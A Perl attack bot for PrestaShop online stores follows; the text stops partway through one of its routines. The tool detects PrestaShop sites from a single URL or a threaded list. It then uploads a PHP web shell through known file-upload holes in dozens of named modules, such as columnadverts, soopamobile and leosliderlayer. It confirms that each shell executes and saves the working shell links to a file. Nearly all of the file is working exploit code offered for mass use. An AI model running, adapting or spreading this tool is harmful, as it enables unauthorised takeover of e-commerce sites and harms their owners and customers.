#!/usr/bin/perl
#Coded By izocin 28/04/2018
#https://www.facebook.com/izo.cin.73
#My Store: https://selly.gg/@izocin
#My Blog: https://izocin.wordpress.com
use WWW::Mechanize;
use LWP::Simple;
use URI::URL;
use LWP::UserAgent;
use Getopt::Long;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
use Getopt::Long;
use HTTP::Request;
use LWP::UserAgent;
use Digest::MD5 qw(md5 md5_hex);
use MIME::Base64;
use IO::Select;
use HTTP::Cookies;
use HTTP::Response;
use Term::ANSIColor;
use HTTP::Request::Common qw(POST);
use URI::URL;
use DBI;
use IO::Socket;
use IO::Socket::INET;
use WWW::Mechanize;
use threads;

system ("izocin bot");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue on_green'),"\n";print color('reset');
print colored ("                                  [ c0d3d bY izocin ]                            ",'white on_green'),"\n";print color('reset');
print colored ("                                   [ PrestaShoP bOT ]                            ",'white on_green'),"\n";print color('reset');
print colored ("                                         [ Multi ]                               ",'white on_green'),"\n";print color('reset');
print colored ("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",'blue   on_green'),"\n";	print color('reset');
$spyhrabchedched = "  
\n \n		
	      PrestaShop perl Bot\n
	    Blog: https://izocin.wordpress.com\n	
\n\n";
################ Check Update #####################
print $spyhrabchedched;
print color('bold yellow'),"[";
print color('bold red'),"1";
print color('bold yellow'),"] ";
print color('bold white'),"Single attack mod\n";
print color('bold yellow'),"[";
print color('bold red'),"2";
print color('bold yellow'),"] ";
print color('bold white'),"Bing Dorker\n";
print color('bold yellow'),"[";
print color('bold red'),"3";
print color('bold yellow'),"] ";
print color('bold white'),"Multitheard Mod\n";


my $whatspywant = <STDIN>;
chomp $whatspywant;
if($whatspywant eq '1'){
single();
}
if($whatspywant eq '2'){
bing();
}
if($whatspywant eq '3'){
beastmode();
}
sub single($site){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');

print <<logo;
                                                              
izocin prestashop bot single mode         
                     
logo

print "\nEnter Your Target URL > ";
$site=<>;
chomp($site);
cmsdetc();
}
sub bing(){
system ("cls");
system("perl dork.pl");
}

sub beastmode($site){
print "Theard : \n";
my $thr = <STDIN>;
chomp $thr;
print "List : \n";

my $file = <STDIN>;
chomp $file;

open(sites,"<".$file) or die $!;
while($site = <sites>)
{
chomp($site);
push(@threads, threads->create (\&bot, $site));
sleep(1) while(scalar threads->list(threads::running) >= $thr);
}
eval {
$_->join foreach @threads;
@threads = ();
};
close(sites);

sub bot(){

cmsdetc();
}

################ CMS DETCTER #####################
sub cmsdetc($site){
##$ua = LWP::UserAgent->new(keep_alive => 1);
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (10);
my $cms = $ua->get("$site")->content;


if($cms =~/Prestashop|prestashop|PrestaShop/) {

    open(save, '>>Prestashopsite.txt');
    print save "$site\n";   
    close(save);



columnadverts();
vtemslideshow();
columnadverts2();
soopamobile();
soopamobile2();
soopamobile3();
realty();
realtyy();
realtyyy();
resaleform();
megaproduct();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
jro_homepageadvertise2();
leosliderlayer();
leosliderlayer2();
vtemskitter();
additionalproductstabs();
addthisplugin();
attributewizardpro();
attributewizardprox();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_flexmenu2();
pk_vertflexmenu();
orderfiles();
nvn_export_orders();
megamenu();
filesupload();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
blocktestimonial();
blocktestimonialt();
}

else{

    open(save, '>>tmp/Unknown.txt');
    print color('reset'); 
    print save "$site\n";   
    close(save);

}



######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/priv.php?c=izo";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"columnadverts";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


sub vtemslideshow(){
my $url = "$site/modules/vtemslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$columnadvertsup="$site/modules/vtemslideshow/slides/priv.php?c=izo";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vtemslideshow";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $columnadvertsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vtemslideshow";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ realty #####################
sub realty(){
my $url = "$site/modules/realty/include/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/realty/include/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"realty";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"realty";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ realtyy #####################
sub realtyy(){
my $url = "$site/modules/realty/evogallery/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/realty/evogallery/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evogallery";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evogallery";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ realtyy #####################
sub realtyyy(){
my $url = "$site/modules/realty/evogallery2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/realty/evogallery2/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evogallery2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"evogallery2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ resaleform #####################
sub resaleform(){
my $url = "$site/modules/resaleform/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/filesupload/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"resaleform";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"resaleform";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ megaproduct #####################
sub megaproduct(){
my $url = "$site/modules/megaproduct/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/megaproduct/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"megaproduct";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"megaproduct";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ soopamobile2 #####################
sub soopamobile2(){
my $url = "$site/modules/soopamobile2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/soopamobile2/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ soopamobile3 #####################
sub soopamobile3(){
my $url = "$site/modules/soopamobile2/uploadproduct.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopamobileup="$site/modules/soopamobile2/slides/priv.php?c=izo";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/izocin/) {
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile3";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopamobileup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopamobile3";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$soopabannersup="$site/modules/soopabanners/slides/priv.php?c=izo";

my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $soopabannersup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"soopabanners";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/priv.php?c=izo";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $vtermslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Vtermslideshow";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ simpleslideshow #####################
sub simpleslideshow(){
my $url = "$site/modules/simpleslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$simpleslideshowup="$site/modules/simpleslideshow/slides/priv.php?c=izo";

my $checksimpleslideshow = $ua->get("$simpleslideshowup")->content;
if($checksimpleslideshow =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $simpleslideshowup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$simpleslideshowup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"simpleslideshow";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ productpageadverts #####################
sub productpageadverts(){
my $url = "$site/modules/productpageadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$productpageadvertsup="$site/modules/productpageadverts/slides/priv.php?c=izo";

my $checkproductpageadverts = $ua->get("$productpageadvertsup")->content;
if($checkproductpageadverts =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $productpageadvertsup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$productpageadvertsup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"productpageadverts";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ homepageadvertise #####################
sub homepageadvertise(){
my $url = "$site/modules/homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$homepageadvertiseup="$site/modules/homepageadvertise/slides/priv.php?c=izo";

my $checkhomepageadvertise = $ua->get("$homepageadvertiseup")->content;
if($checkhomepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ homepageadvertise2 #####################
sub homepageadvertise2(){
my $url = "$site/modules/homepageadvertise2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$homepageadvertise2up="$site/modules/homepageadvertise2/slides/priv.php?c=izo";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"homepageadvertise2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ columnadverts2 #####################
sub columnadverts2(){
my $url = "$site/modules/columnadverts2/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$homepageadvertise2up="$site/modules/columnadverts2/slides/priv.php?c=izo";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"columnadverts2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"columnadverts2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ filesupload #####################
sub filesupload(){
my $url = "$site/modules/filesupload/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$homepageadvertise2up="$site/modules/filesupload/uploads/priv.php?c=izo";

my $checkhomepageadvertise2 = $ua->get("$homepageadvertise2up")->content;
if($checkhomepageadvertise2 =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"filesupload";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $homepageadvertise2up\n";
open (TEXT, '>>Shells.txt');
print TEXT "$homepageadvertise2up\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"filesupload";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ jro_homepageadvertise #####################
sub jro_homepageadvertise(){
my $url = "$site/modules/jro_homepageadvertise/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise/slides/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ jro_homepageadvertise2 #####################
sub jro_homepageadvertise2(){
my $url = "$site/modules/jro_homepageadvertise2//uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/jro_homepageadvertise2/slides/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"jro_homepageadvertise2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ leosliderlayer #####################
sub leosliderlayer(){
my $url = "$site/modules/leosliderlayer/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/leosliderlayer/slides/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"leosliderlayer";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
